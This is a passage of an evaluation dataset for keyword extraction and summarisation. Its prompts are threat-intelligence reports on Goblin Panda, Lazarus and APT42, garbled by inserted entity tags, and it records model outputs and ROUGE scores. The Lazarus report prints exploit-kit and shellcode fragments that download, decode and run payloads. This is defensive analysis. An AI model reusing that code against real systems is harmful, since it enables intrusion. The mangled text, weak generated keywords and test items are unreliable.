cials . They", "generated_text": "the report; Goblin Panda; the Bears; Russian; the malware; the RAT; PlugX; Sisfader RAT; the same techniques; encryption; EQNEDT32.exe; the same loop; decryption; the payload; the same algorithm; a specific XOR; a code; the same function; the dll; the module; the compromise; the campaign; the same infrastructure; Russia; vulnerabilities; a ransomware; system information; Analysis; the same techniques; the CVE-2017-8570; 11882; Analysis; the same techniques; the same interface; the same malware; the C2; Microsoft; a network; a network.", "ref_text": "<START-1>The article analyzes two RTF malware documents that exploit CVE-2017-11882 to deliver a remote access trojan payload. The RTFs use the same exploitation techniques but deliver different payloads than past Goblin Panda activity targeting Vietnam officials. Analysis shows the payload is a version of the SisFader RAT, which uses anti-emulation and encryption techniques similar to past Goblin Panda malware. Infrastructure links the activity to Goblin Panda APT group and the SisFader RAT. The C2 domains resolve to IP addresses in Shanghai. Unlike past targeting of Vietnam, this campaign targeted Russian telecom firms pretending to be Russia's FSB intelligence agency. Goblin Panda has evolved their techniques from prior SisFader RAT analysis and continues to target telecom sectors aligned with intelligence collection goals. Indicators of compromise for the malware documents, C2 infrastructure, and RAT payload are provided. In summary, the post analyzes a Goblin Panda campaign distributing an updated version of the SisFader remote access trojan via exploitation of Russian telecom entities. It highlights the evolving techniques and targeting of this Chinese threat actor. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49836065573770494, "gpt3/lexical/rouge_rouge2": 0.1716171617161716, "gpt3/lexical/rouge_rougeL": 0.2098360655737705, "gpt3/lexical/rouge_rougeLsum": 0.2098360655737705, "gpt3_generated_text": ["The article discusses the activities of a threat actor known as Goblin Panda, who is targeting Russian telecom firms using a version of the Sisfader RAT malware. The malware utilizes the same techniques as previous campaigns, such as exploiting the CVE-2017-11882 vulnerability in Microsoft Office and using encryption and decryption algorithms. The payload is encrypted in an 8.t file and the malware creates a service for persistence. The article also mentions the use of a specific XOR loop and the modification of a com object for persistence. The infrastructure used by Goblin Panda is linked to Russia, specifically the FSB. The article concludes that Goblin Panda is using the Sisfader RAT to target Russian telecom firms, employing similar techniques as their previous campaigns against Vietnamese officials."]}, {"split_name": "val", "sample_id": "val_47", "prompt_text": "Extract the keywords: [CARDINAL] 6 \u2f00 \u00bbBAE SYSTEMS THREAT RESEARCHBLOG \u2f74 \u2f0a [ORG] Resources [ORG] Contact [ORG] usHomeProductsSolutionsNews [ORG] & [ORG] EventsPartnersAbout UsCareersSEARCHTHREAT RESEARCH BLOGHome \u00bb Unlabelled \u00bb Lazarus \u2019 False Flag MalwarePosted by [PERSON] Sergei [PERSON] Shevchenko - [DATE] Monday , [DATE] 20 [DATE] February [DATE] 2017 [ORG] LAZARUS \u2019 FALSE FLAG MALWAREWritten by [PERSON] Sergei [PERSON] Shevchenko and [NORP] Adrian NishBACKGROUNDWe continue to investigate the recent wave of attacks on banks using watering - holes on [CARDINAL] at [CARDINAL] least [CARDINAL] two financial regulator websites as well as others . Our initial analysis of malware disclosed in the [ORG] BadCyber blog hinted at the involvement of the ' Lazarus ' threat actor . Since the release of our report , more samples have come to light , most notably those described in the [NORP] Polish language niebezpiecznik.pl blog on [DATE] 7 [DATE] February [DATE] 2017.MD5 hash9216b29114fb6713ef228370cbfe dN / AN / A2016 - 10- 04:11N / AN / AWin64 [CARDINAL] 470 KBN / AN / A2017 - 01- [CARDINAL] 15:15Of the hashes provided , [CARDINAL] only [CARDINAL] three samples could be found in public malware repositories . All [CARDINAL] three had been submitted from [GPE] Poland in [DATE] recent [DATE] weeks . In the analysis section below we examine these and the \u2018 false flag \u2019 approach employed by the attackers in order to spoof the origin of the attack . The same \u2018 false flag \u2019 approach was also found in the [ORG] SWF - based exploit mentioned in our previous 2016 - 12 - 07 23:15Here we \u2019ll analyse these files as well as shed further light on the watering - hole exploit kit code itself , in the hope this aids further detection and network defence . ANALYSISSample # 1 \u2013 srservice.chmMost likely , this file is an encrypted backdoor that is decrypted and injected by [ORG] DLL loader . The filename srservice.chm is consistent with the method in which a known [ORG] Lazarus toolkit module constructs [ORG] CHM and [ORG] HLP file names:%SYSTEMROOT%\\Help\\%MODULE_NAME%.chm % SYSTEMROOT%\\Help\\%MODULE_NAME%.hlpSample # 2 \u2013 srservice.hlpMost likely , this file is an encrypted configuration file , which is decrypted and loaded by the sample # [MONEY] 1 ( srservice.chm).Sample # 3 \u2013 srservice.dllThis [ORG] DLL loads , decrypts and injects the ' [ORG] CHM ' file into the system lsass.exe process . Sample # 4 \u2013 fdsvc.exeThis file is a command line tool that accepts several parameters such as encrypted file name and process ID . The tool reads and decrypts the specified file , and then injects it into the specified process or into the system process explorer.exe . The encryption consists of a running [WORK_OF_ART] XOR , followed with RC4 , using the 32 - byte RC4 key below : A6 EB 96 00 61 B2 E2 EF 0D CB [PRODUCT] E8 [PRODUCT] C4 [PRODUCT] 5A F1 [CARDINAL] 66 9C A4 [CARDINAL] 80 CD [CARDINAL] 9A F1 [CARDINAL] 2F [CARDINAL] 46 25 [CARDINAL] 2F DB [CARDINAL] 16 [CARDINAL] 26 4B [CARDINAL] C4 [CARDINAL] 3F 3CSample # 5 \u2013 fdsvc.dllThe file fdsvc.dll is an encrypted file , successfully decrypted into a valid [ORG] DLL fdsvc.exe . Once decrypted , it represents itself as a bot that accepts the [ORG] C&C name and port number(s ) as a string parameter that is used to call the [ORG] DLL . The parameter is encoded with an XOR loop that includes XOR key cEzQfoPw . Multiple [ORG] C&C servers can be delimited with the ' | ' character and port numbers are delimited from the [ORG] C&C servers with the ' : ' character . Once the bot has established communication with the remote [ORG] C&C , it uses several transliterated [NORP] Russian words to either indicate the state of its communication or issue backdoor commands , such as : State / Backdoor [ORG] Command start communication sessionWord \" [WORK_OF_ART] Nachalo \" \" ustanavlivat \" handshake state \" vykhodit\"receive data send data maintain communication session exit communication sessionThe binary protocol is custom . For example , during the \" ustanavlivat \" ( handshake ) mode , the bot accepts [CARDINAL] 4 bytes , which are then decrypted . The decryption is a loop that involves multiple XOR operations performed over the received data . Once decrypted , the [CARDINAL] 4 bytes indicate the size of the next data chunk to be received . The next received data chunk is also decrypted , and its contents checked to see whether it 's [CARDINAL] one of the backdoor commands . For example , the \" poluchit \" command instructs the bot to receive the file , and the \" pereslat \" ( send ) command instructs the bot to upload the file . The received \" poluchit \" command may also contain a URL , marked with another transliterated [NORP] Russian word \" ssylka \" ( link ) . In this case , the remote file is fetched in a separate thread . If a received data chunk contains the command \" vykhodit \" , the bot quits its backdoor loop . The bot implements the SSL / TLS protocol , and is based on a source code of \" [WORK_OF_ART] Curl v7.49.1 \" . Hence , it is able to transfer files via HTTP , [ORG] HTTPS , [ORG] FTP , [ORG] SMTP and many other protocols , with full support of user / password authentication ( Basic , Digest , [ORG] NTLM , Negotiate , [GPE] Kerberos ) , proxies and SSL certificates . [LANGUAGE] Russian language used in fdsvc.dllIn spite of some ' [NORP] Russian ' words being used , it is evident that the malware author is not a native [NORP] Russian speaker . Of our previous examples , [CARDINAL] five of the commands were likely produced by an online translation . Below we provide the examples and the correct analogues for reference : Word\"ustanavlivat\"\"poluchit \" \" pereslat \" \" derzhat\"\"vykhodit\"Type of error omitted sign at the end , verb tense error omitted sign at the end omitted sign at the end omitted sign at the end omitted sign at the end , verb tense errorCorrect analogue\"ustanovit ' \" or \" ustanoviti\"\"poluchit ' \" or \" poluchiti \" \" pereslat ' \" or \" pereslati \" \" derzhat ' \" or \" derzhati\"\"vyiti\"Another example is \" kliyent2podklyuchit \" . This is most likely a result of an online translation of \" client2connect \" ( which means ' client - to - connect ' ) . In this case , the [CARDINAL] two words \" client \" and \" connect \" were translated separately , then transliterated from the [NORP] Russian pronunciation form into the [NORP] Latin alphabet and finally joined to produce \" kliyent2podklyuchit\" . Such a result may look impressive to the bot 's author , but would be difficult to understand for native [NORP] Russian speakers . Here we provide an example of translating the word \" client \" in [LANGUAGE] Russian - the word \" kliyent \" here only demonstrates phonetic pronunciation , not how it 's actually written in a transliterated form . When formed using the [NORP] Latin alphabet , it would actually be written \" client \" or \" klient\" . Due to such inconsistencies , we conclude that the [NORP] Russian language is likely used as a decoy tactic , in order to spoof the malware \u2019s country of origin . Sample # 6 \u2013 cambio.swfDuring the investigation of the watering - hole incident , the owner of a compromised website shared with us a malicious implant that was added into the site , presumably by using an exploit against [ORG] JBoss 5.0.0.The script is called view_jsp.java and is accessed from the watering - hole website as view.jsp . This script is responsible for serving cambio.swf . The infection starts from a primary web site being compromised so that its visitors are redirected into a secondary website , calling its view.jsp script from an added IFrame . The initial request contains parameter pagenum set to [CARDINAL] 1 , such as:\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1\"This begins the profiling and filtering to identify potential victims . For example , the script then checks to see if the client 's [ORG] IP is black - listed . If so , such initial request is rejected . Next , the script checks if the client \u2019s [ORG] IP is white - listed ( i.e. targeted ) . If not white - listed , it is also rejected . Hence , unless the visitor \u2019s [ORG] IP is on the attackers \u2019 list , the script will not attempt to infect their machine . This helps the infected websites stay undetected for relatively long period of time , as they only serve exploits to the selected targets . In the next stage of the script , it builds and serves back to the client an HTML page with an embedded JavaScript that detects the type of client \u2019s browser ( Internet Explorer , [PERSON] Google [PERSON] Chrome , [PERSON] Firefox , [PERSON] Safari , or [ORG] Opera ) , OS version , and the loaded plugins , such as [PERSON] Adobe [PERSON] Flash and [PERSON] Microsoft [PERSON] Silverlight . The script executed on a client side then builds a form , and submits it back to the gateway script , as shown below : The submitted form specifies the pagenum parameter to be set to [CARDINAL] 2 , to advance the script to the next step : Once the script accepts the incoming request and finds the form 's pagenum value is [CARDINAL] 2 , it reads other fields from the submitted form and decides which exploit to serve back to the client . At the time of writing , the exploit kit known to serve back [CARDINAL] two exploits , for [PERSON] Adobe [PERSON] Flash and [PERSON] Microsoft [PERSON] Silverlight , though these could be expanded upon as needed . The exploits can be individually enabled or disabled by the attackers with the standalone file config.dat . For example , to enable both exploits ( flag=1 ) , the contents of this file can be set to:2016 - 0034:1 0000 - 0001:1where [DATE] 2016 - 0034 identifies the [PERSON] Silverlight exploit , and 0000 - 0001 is the [PERSON] Flash exploit . If the script detects that the submitted form contains a non - empty version of Silverlight browser plugin , it will generate and serve back a Silverlight exploit . If the submitted form has a non - empty version of [PERSON] Adobe [PERSON] Flash browser plugin , the script will generate and serve back the [PERSON] Flash exploit . If the client has both plugins loaded within the browser , then the script will serve the [PRODUCT] Flash exploit only . NOTE : the script only serves the [PERSON] Flash exploit if the browser is Internet Explorer . The exploits are generated by the functions:\u2022 genExp_20160034 ( ) \u2013 to generate Silverlight exploit \u2022 genExp_00000001 ( ) \u2013 to generate [WORK_OF_ART] Flash [WORK_OF_ART] exploitThe latter is explained in further detail below . [ORDINAL] First , the script builds URL string namedas download_url:01 String PARAMNAME_UID = \" uid \" ; [CARDINAL] 02 String PARAMNAME_PAGENUM = \" pagenum \" ; [CARDINAL] 03 String PARAMNAME_EXPLOITID = \" eid \" ; [CARDINAL] 04 String PARAMNAME_STATUS = \" s \" ; [CARDINAL] 05 String PARAMNAME_DATA = \" data \" ; [CARDINAL] 06 07 download_url = request.getRequestURL ( ) + 13 download_url = download_url + 14 15 \" ? \" + PARAMNAME_UID + \" = \" + uid + \" = \" + exploit.get(\"eid \" ) ; \" & \" + PARAMNAME_STATUS + \" = [CARDINAL] 2 \" + \" & \" + PARAMNAME_DATA + \" = \" ; For example , the URL string may look like : url uid=30304811&pagenum=3&eid=00000002&s=2&data = Note that the pagenum parameter of the URL has now advanced to [CARDINAL] 3 ( [ORDINAL] third step of the view.jsp execution).This URL string will be embedded by the genExp_00000001 ( ) function into the body of the shellcode . The output of the genExp_00000001 ( ) function is JavaScript that has the following format \u2013 this script will be executed inside the client 's browser:// base64 - decode string s01 var laskfji = ' PGh0bWw+ ' ; // long string here [CARDINAL] 02 asdlfkj = function(s ) { [CARDINAL] 05 var polkio = asdlfkj(laskfji ) ; [CARDINAL] 06 var poikea = ' document.write(polkio ) ; ' ; [DATE] 07 eval(poikea);Once the string s is base64 - decoded by client - based [ORG] JavaScript , it will look like a [PRODUCT] Flash object embedded into HTML:<body>01 < html > 21 < /html></object></body><object classid=\"clsid : d27cdb6e - ae6d-11cf-96b8 - 444553540000\"codebase=\"url \" width=\"1 \" height=\"1 \" > < param name=\"movie \" value=\"include / cambio.swf \" / > < param name=\"allowScriptAccess \" value=\"always \" / > < param name=\"FlashVars\"value=\"shell=558BEC83 00&Health = polki89jdm#ks@ \" /><param name=\"Play \" value=\"true \" / > < embed type=\"application / x - shockwave - flash\"width=\"1 \" height=\"1 \" src=\"include / cambio.swf \" allowScriptAccess=\"always \" FlashVars=\"shell=558BEC83 00&Health = polki89jdm#ks@ \" Play=\"true\"/>As seen in the [PRODUCT] Flash object parameters , the [ORG] SWF object is served from the website \u2019s path : include / cambio.swfHowever , the [ORG] SWF object is also accompanied with [CARDINAL] 2 extra parameters : [ORG] SWF [ORG] Parameter [ORG] Value polki89jdm#ks@By looking into the decompiled cambio.swf file , its [ORG] ActionScript reveals that the [ORG] SWF file indeed expects [CARDINAL] 2 parameters : Health and shell . The value of [ORG] Health is used as an XOR key to decode the binary blob orinBin , which is included in the [ORG] SWF file . This blob is then loaded with loadBytes ( ) , as shown below:01 objLoader = new Loader ( ) ; [CARDINAL] 02 this.params = loaderInfo.parameters ; [CARDINAL] 03 [CARDINAL] 04 var key : String = params[\"Health \" ] as String ; [CARDINAL] 05 var [ORG] pShell : String = params[\"shell \" ] as String ; [CARDINAL] 06 var objShellData : SharedObject = SharedObject.getLocal(\"Exp_Data \" ) ; [CARDINAL] 07 objShellData.clear ( ) ; [CARDINAL] 08 objShellData.data.shell = [ORG] pShell ; [CARDINAL] 09 [PERSON] objShellData.flush ( ) ; [CARDINAL] 10 var blob : [ORG] ByteArray = new orinBin ( ) as [ORG] ByteArray ; [CARDINAL] 11 var i : int = [CARDINAL] 0 ; [CARDINAL] 12 while(i < blob.length ) [CARDINAL] 17 blob.position = [CARDINAL] 0 ; [CARDINAL] 18 objLoader.contentLoaderInfo.addEventListener(\"complete\",fncomp ) ; [CARDINAL] 19 objLoader.loadBytes(blob);blob[i ] = blob[i ] ^ key.charCodeAt(i % key.length ) ; i++;Below is the binary blob orinBin as seen within the [ORG] SWF file : By knowing the value of Health parameter , it is now possible to use it as an XOR key to decode the orinBin blob within the [ORG] SWF code . Once decrypted , the orinBin blob presents another [ORG] SWF file . This time , it contains [CARDINAL] 3 encrypted blobs within : bin22 , bin23 , and bin24 seen below : The code decrypts the blobs with RC4 , using \" littleEndian \" as the RC4 key . These blobs also turn out to be [ORG] SWF files that contain the [ORG] SWF exploit code . Internally , the [ORG] ActionScript also uses transliterated [NORP] Russian words , similar to the tactic seen in the bot code : Transliterated [NORP] Russian words used in [ORG] AS [ORG] Translated from [ORG] Russian [ORG] babaLEnaPreparation of farm animals Hey , hey , hey [CARDINAL] 3 times [PERSON] Dummy ( a stupid person ) [PERSON] Dummy 's address Let \u2019s search for data Searching in ' pro ' Calling the dummy ( a stupid person ) Get address of the dummy Execute farm animals Old woman [DATE] LenaAs seen in the table , while the words are technically [NORP] Russian , their usage is out - of- context . In [CARDINAL] one code fragment , the [ORG] ActionScript contains both \" chainik \" and \" dummy\":return chainik.call.apply(null , param1);01 private function put_dummy_args(param1 :* ) : * [CARDINAL] 05 private function vyzov_chainika ( ) : * [CARDINAL] 08 } return chainik.call(null);As such , it is obvious that the word \" dummy \" has been translated into \" chainik \" . However , the word \" chainik \" in [LANGUAGE] Russian slang ( with the literal meaning of \" a kettle \" ) is used to describe an unsophisticated person , a newbie ; while , the word \" dummy \" in the exploit code is used to mean a \" placeholder \" or an \" empty \" data structure / argument . In the same way , it is likely the word \" farm animals \" was originally used to represent \" a beast \" . Yet , it has been translated into a word that is only synonymous to \" the beast \" in a certain context . As a result , they have used the words \" farm animals \" across the shellcode instead of \" beast \" ; which makes little sense . As in the case of sample # [MONEY] 5 ( fdsvc.dll ) , it is likely that this loose [NORP] Russian translation , evidently performed by a non - [NORP] Russian speaker , is intended to spoof the malware origin . [ORG] ShellcodeThe [ORG] SWF 's [ORG] ActionScript then loads and executes the shellcode that was passed to the [ORG] SWF file . As with the [ORG] Health parameter , by having access to the server - side code it is now possible to analyse what shellcode has been served to be executed via [ORG] SWF file . The shellcode consists of [CARDINAL] 2,372 bytes of a Win32 - code ( in fact , [CARDINAL] 2,369 bytes padded with [CARDINAL] three [CARDINAL] zero bytes to make it [QUANTITY] 4 - byte aligned).The shellcode passed via the shell parameter consists of [CARDINAL] two parts:\u2022 The [ORDINAL] first part of the shellcode ( [CARDINAL] 818 bytes ) creates a hidden process of notepad.exe . It then injects the [ORDINAL] second part of the shellcode into it using the [PRODUCT] VirtualAlloc ( ) and [PERSON] WriteProcessMemory ( ) APIs , and finally it runs the injected code with CreateRemoteThread ( ) API.\u2022 The [ORDINAL] second part of the shellcode ( [CARDINAL] 1,551 bytes ) is encoded with XOR 0x57 : seg000:00000316 seg000:0000031B seg000:00000320 loop : seg000:00000326mov ecx , [DATE] 1551 ; counter mov ebx , [DATE] 57h ; XOR keyxor [ eax ] , ebx dec ecx ; decrement counter inc eax ; advance pointer test ecx , ecx jnz short loopIt 's worth noting that both parts of the shellcode load the APIs similarly to all other tools from the [ORG] Lazarus toolset , e.g.:01 urlmon_dll = ' mlrU ' ; // Urlm 02 urlmon_dll_4 = ' d.no ' ; // on.d [CARDINAL] 03 urlmon_dll_8 = 'll ' ; // ll [CARDINAL] 04 URLDownloadToFileW = ' DLRU ' ; // URLD [CARDINAL] 05 URLDownloadToFileW_4 = ' lnwo ' ; // ownl [CARDINAL] 06 URLDownloadToFileW_8 = ' Tdao ' ; // oadT [CARDINAL] 07 URLDownloadToFileW_12 = ' liFo ' ; // oFile 08 URLDownloadToFileW_16 = ' We ' ; // eW [CARDINAL] 09 hLib = [PERSON] LoadLibrary(&urlmon.dll ) ; [CARDINAL] 10 ptr[8 ] = ( * ( int)ptr[4])(hLib , // ptr[4]->GetProcAddress [CARDINAL] 11 & URLDownloadToFileW);Once decoded , the [ORDINAL] second part of the shellcode reads the URL embedded at the end , then downloads and saves a file under a temporary file name , using the prefix \" tmp\" . Next , it reads the temporary file into memory , decrypts it with the following XOR loop , starting from the [ORG] 318th byte:01 for ( i = [CARDINAL] 317 ; i < file_size ; + + i ) [CARDINAL] 04 } buffer[i ] ^= 0xCC ^ ( ( buffer[i ] ^ 0xCC ) > > 4);Next , it makes the decoded data executable by assigning it PAGE_EXECUTE_READWRITE memory protection mode , and calls it , as shown below:01 ( * ( void)(ptr[68]))(buffer + [CARDINAL] 318 , // ptr[68]->VirtualProtect [CARDINAL] 02 file_size - [CARDINAL] 318 , // skip the [ORDINAL] first [CARDINAL] 318 bytes [CARDINAL] 05 ( ( void ( * ) ( void))(buffer + [CARDINAL] 318 ) ) ( ) ; // CALL from the 318th bytendThis way , the [CARDINAL] 2 part of the shellcode downloads a binary from the same gateway script as before . pagenum=3 means it 's a [CARDINAL] 3 step \u2013 a step of serving the next chunk of the [ORG] shellcode.rdTo understand the next step we need to go back to the gateway script to see how it processes the pagenum=3 request . When the script receives a pagenum=3 request , it checks the 's ' URL parameter ( ' status ' ) . Initially , this parameter is set to [CARDINAL] 2 ( ' s=2 ' , as seen in the aforementioned URL embedded into the [ORG] SWF exploit).Thus , the script will read and output the contents of [CARDINAL] 2 files stored on the web server : files / mark180789172360.ico files / back283671047171.datThe [ORDINAL] first file is likely a valid [ORG] ICO file , is [CARDINAL] 318 bytes in size , and its contents are not encoded ( hence the reason why the shellcode skips the [ORDINAL] first [CARDINAL] 318 bytes , and only decodes the rest).The [ORDINAL] second file is a [CARDINAL] 3 chunk of the shellcode , and its contents are [ORG] encoded.rdIn addition to these 2 files , the output is appended with a URL . This time , it will specify pagenum parameter set to [CARDINAL] 3 , but the status parameter s will now be set to [CARDINAL] 3 . For example , the URL may look like : url appended URL will then be encoded the same way as the file back283671047171.dat:01 for ( int i = [CARDINAL] 0 ; i < len + 9 ; i++ ) [CARDINAL] 08 } byte var = [ORG] b[i ] ; byte temp = ( byte)((var > > 4 ) & 0x0F ) ; var = ( byte)(var ^ temp ) ; var = ( byte)(var ^ 0xCC ) ; b[i ] = var;This way , the encoded URL becomes an integral part of the [CARDINAL] 3 part of the shellcode \u2013 same way as the [CARDINAL] 2 part of the shellcode was appended with a URL.ndrdFollowing that , the script serves back a blob that consists of [QUANTITY] three [QUANTITY] parts:\u2022 [QUANTITY] files / mark180789172360.ico , not encoded ( [CARDINAL] 318 bytes ) \u2022 files / back283671047171.dat , encoded \u2022 download URL , encodedIt is served back as a binary file , disguised as an icon file [PERSON] probg[RANDOM].ico , probably in an attempt to bypass network sniffers ( in other words , the encrypted shellcode is served appended to a valid icon file):response.setHeader(\"Accept - Ranges \" , \" bytes \" ) ; response.setHeader(\"Content - Length \" , [PERSON] String.format(\"%d \" , response_len ) ) ; response.setHeader(\"Content - Disposition \" , \" attachment;filename=\\\"probg \" + rand.nextInt(9000 ) + 10000 + \" .ico\\ \" \" ) ; response.setHeader(\"Content - Type \" , \" application / octet- stream\");rdOnce this [CARDINAL] 3 part of the shellcode is served back to the shellcode that runs on a client side , it will skip the [ORDINAL] first [CARDINAL] 318 bytes , decode the rest and execute it . This will invoke another binary download \u2013 this time identified with the status value of [CARDINAL] 3 ( ' s=3').The new binary is generated by view.jsp script and is almost identical to the [CARDINAL] 3 rd part of the shellcode . The only difference is that the binary blob consists of these files : files / mark180789172360.ico , not encoded ( [CARDINAL] 318 bytes ) , as before files / meml102783047891.dat , encodedndThe [CARDINAL] 2 file is now different , and the URL is no longer appended . The reason why the new binary does not need the URL embedded may be that this binary contains an actual malicious executable , detached , decoded , and executed by the shellcode , thus leading to a full compromise of the victim . Indeed , as seen in the web log below , the last GET request with the pagenum=3 and s=3 parameters is served with a 123,710 - byte response \u2013 large enough to accommodate a PE - executable:\"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1 \" [CARDINAL] 200 66148 \" POST /[PATH]/view.jsp HTTP/1.1 \" 200 13991 \" GET /[PATH]/view.jsp ? uid=30304811&pagenum=3&eid=00000002&s=2&data= HTTP/1.1 \" [CARDINAL] 200 4642 \" GET /[PATH]/view.jsp?uid=30304811&pagenum=3&s=3 HTTP/1.1 \" [CARDINAL] 200 [CARDINAL] 123710NOTE : At the time of analysis , the [ORG] ICO / DAT files were not available . Hence , their contents remains unknown . Overall SchemeThe following scheme illustrates the steps outlined above : CONCLUSIONSHere we have analysed further files from the recent watering - hole attacks directed at [NORP] Polish financial institutions and others . Evidently , the [ORG] Lazarus group are continuing their campaign targeting banking networks . Their watering - hole mechanism is fairly sophisticated \u2013 its multiple stages are designed to complicate analysis of its malware distribution , and at the same , stay undetected for as long as possible . Because of the previously disclosed attribution links , the group are also resorting to some trickery . Through reverse - engineering , we can see the use of many [NORP] Russian words that have been translated incorrectly . In some cases the inaccurate translations have transformed the meaning of the words entirely . This strongly implies that the authors of this attack are not native [NORP] Russian speakers and , as such , the use of [NORP] Russian words appears to be a ' false flag ' . Clearly the group behind these attacks are evolving their modus operandi in terms of capabilities \u2013 but also it seems they \u2019re attempting to view.jsp?pagenum=1 view.jsp?uid=MD5 [TIME] HashesFilenamesURLsat 08:51 + [TIME] 6 [ORG] Recommend this on [ORG] GoogleNo comments : Post a CommentEnter your comment Comment as : Select profile [ORG] Publish [ORG] PublishPreview [ORG] PreviewOLDER [ORG] POSTSUBSCRIBESign up to receive our regular [FAC] Cyber [FAC] Threat [FAC] Bulletin . Sign upPOPULAR POSTSTWO BYTES TO $ [MONEY] 951MCYBER [ORG] HEIST [ORG] ATTRIBUTIONNEW [ORG] MAC OS [PERSON] MALWARE [PERSON] EXPLOITS MACKEEPERCONTACTFor further information or to talk to an expert , please contact us.learn@baesystems.comContactAccessibilityTerms & conditionsPrivacySitemap \u00a9 2015 [ORG] BAE [ORG] Systems . All rightsreserved", "generated_text": "the report; financial regulator websites; banks; watering-holes; Polish; links; the Lazarus malware; a DLL; a command line tool; a bot; C2; a command; execution; a configuration file; a DLL; a file; an encrypted configuration file; a command; The key; A6 EB 96; B2; E8; C4; C2; C2; PHP; the C&C name; port; a command; a DLL; a snippet; a DLL; a script; the use; C2; detection; the use.", "ref_text": "<START-1>The document analyzes malware used in watering hole attacks on financial institutions attributed to the Lazarus cybercrime group. The malware uses false flags and misleading translations to disguise its origin and evade detection. The attacks start by compromising websites to serve exploits that download malware. The malware stages use encoded shellcode and downloading of components to complicate analysis. Decoding reveals loosely translated Russian words likely meant to mislead investigators into thinking the malware is from Russia. The multi-stage process ultimately leads to execution of unknown final payloads on target systems. The false flags and evolving techniques aim to avoid detection, but in-depth analysis enables attribution and highlights the need for continued monitoring of Lazarus campaigns. Defensive recommendations include implementing provided indicators of compromise. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.415929203539823, "gpt3/lexical/rouge_rouge2": 0.08035714285714285, "gpt3/lexical/rouge_rougeL": 0.21238938053097345, "gpt3/lexical/rouge_rougeLsum": 0.21238938053097345, "gpt3_generated_text": ["This article discusses a recent wave of attacks on banks using watering-holes on financial regulator websites. The report mentions the involvement of the Lazarus threat actor based on the analysis of malware disclosed in the BadCyber blog. The article provides an analysis of several samples of malware, including a DLL, a command line tool, and a bot. It also highlights the use of a false flag approach by the attackers to spoof the origin of the attack. The article aims to aid in the detection and defense against these attacks by shedding light on the malware and exploit kit code."]}, {"split_name": "val", "sample_id": "val_48", "prompt_text": "Extract the keywords: T H R E A T I N T E L L I G E N C E R E P O R TAPT42 : Crooked Charms , Cons and CompromisesAPT42Executive Summary2Mandiant assesses with high confidence that APT42 is an [NORP] Iranian state - sponsored cyber espionage group tasked with conducting information collection and surveillance operations against individuals and organizations of strategic interest to the [NORP] Iranian government . We further estimate with moderate confidence that APT42 operates on behalf of [ORG] the [ORG] Islamic [ORG] Revolutionary [ORG] Guard [ORG] Corps ( [ORG] IRGC ) [ORG] Intelligence [ORG] Organization ( IRGC - [GPE] IO ) based on targeting patterns that align with the organization 's operational mandates and priorities . Active since [DATE] at [DATE] least [DATE] 2015 , APT42 is characterized by highly targeted spear phishing and surveillance operations against individuals and organizations of strategic interest to [GPE] Iran . The group \u2019s operations , which are designed to build trust and rapport with their victims , have included accessing the personal and corporate email accounts of government officials , former [NORP] Iranian policymakers or political figures , members of the [NORP] Iranian diaspora and opposition groups , journalists , and academics who are involved in research on [GPE] Iran . After gaining access , the group has deployed mobile malware capable of tracking victim locations , recording phone conversations , accessing videos and images , and extracting entire SMS inboxes . APT42 has a demonstrated ability to alter its operational focus as [GPE] Iran \u2019s priorities evolve over time . We anticipate APT42 will continue to conduct cyber espionage operations in support of [GPE] Iran \u2019s strategic priorities in the long term based on their extensive operational history and imperviousness to public reporting and infrastructure takedowns . [ORG] OverviewMandiant assesses with high confidence that APT42 is a prolific and well - resourced threat actor that carries out [NORP] Iranian state- sponsored espionage and surveillance activity in support of [GPE] Iran \u2019s strategic priorities . The group has been active since [DATE] at [DATE] least [DATE] early [DATE] 2015 and relies primarily on highly targeted social engineering efforts to achieve its objectives against both individuals and organizations of interest to the [NORP] Iranian government . APT42 operations broadly fall into [CARDINAL] three categories:\u2022 Credential harvesting : APT42 frequently targets corporate and personal email accounts through highly targeted spear- phishing campaigns with enhanced emphasis on building trust and rapport with the target before attempting to steal their credentials . Mandiant also has indications that the group uses credential harvesting to collect Multi - Factor Authentication ( [ORG] MFA ) codes to bypass authentication methods and has used compromised credentials to pursue access to the networks , devices and accounts of employers , colleagues and [ORG] relatives.3\u2022 [ORG] Surveillance operations : As of [DATE] at [DATE] least [DATE] late [DATE] 2015 , a subsetof APT42 \u2019s infrastructure served as command - and - control ( C2 ) servers for [ORG] Android mobile malware designed to track locations , monitor communications and generally surveil the activities of individuals of interest to the [NORP] Iranian government , including activists and dissidents inside [PERSON] Iran.\u2022 [PERSON] Malware deployment : While APT42 primarily prefers credentialharvesting over activity on disk , several custom backdoors and lightweight tools complement its arsenal . The group likely incorporates these tools into their operations when the objectives extend beyond credential harvesting . [ORG] Mandiant has observed over [CARDINAL] 30 confirmed APT42 targeted operations spanning these categories since [DATE] early [DATE] 2015 . The total number of APT42 intrusion operations is almost certainly much higher based on the group \u2019s high operational tempo , visibility gaps caused in part by the group \u2019s targeting of personal email accounts and domestically focused efforts and extensive open - source industry reporting on threat clusters likely associated with APT42.APT42 had been previously tracked by [ORG] Mandiant as UNC788.APT42Credential HarvestingSurveillance OperationsMalware DevelopmentFIGURE [CARDINAL] 1 . APT42 operations by category.4APT42 has targeted the following sectors:\u2022 Civil society and nonprofits\u2022 Education\u2022 [ORG] Governments\u2022 [ORG] Healthcare\u2022 [ORG] Legal and professional services\u2022 Manufacturing\u2022 [ORG] Media and entertainment\u2022 PharmaceuticalsAPT42 has targeted organizations in [CARDINAL] at [CARDINAL] least [CARDINAL] 14 countries since our [ORDINAL] first observation of its activity in [DATE] 2015 , including in [GPE] Australia , [LOC] Europe , [LOC] the [LOC] Middle [LOC] East and [GPE] the [GPE] United [GPE] States . [ORG] TargetingThe targeting patterns for APT42 operations are similar to other [NORP] Iranian cyber espionage actors , with a large segment of activity focused on [LOC] the [LOC] Middle [LOC] East region . However , unlike other suspected [ORG] IRGC - affiliated cyber espionage groups that have focused on targeting the defense industrial base or conducting large - scale collection of personally identifiable information ( PII ) , APT42 primarily targets organizations and individuals deemed opponents or enemies of the regime , specifically gaining access to their personal accounts and mobile devices . The group has consistently targeted Western think tanks , researchers , journalists , current [NORP] Western government officials , former [NORP] Iranian government officials and the [NORP] Iranian diaspora abroad . Some APT42 activity indicates the group alters its operational focus as [GPE] Iran \u2019s priorities evolve . This includes targeted operations against the pharmaceutical sector at the onset of the [PRODUCT] COVID-19 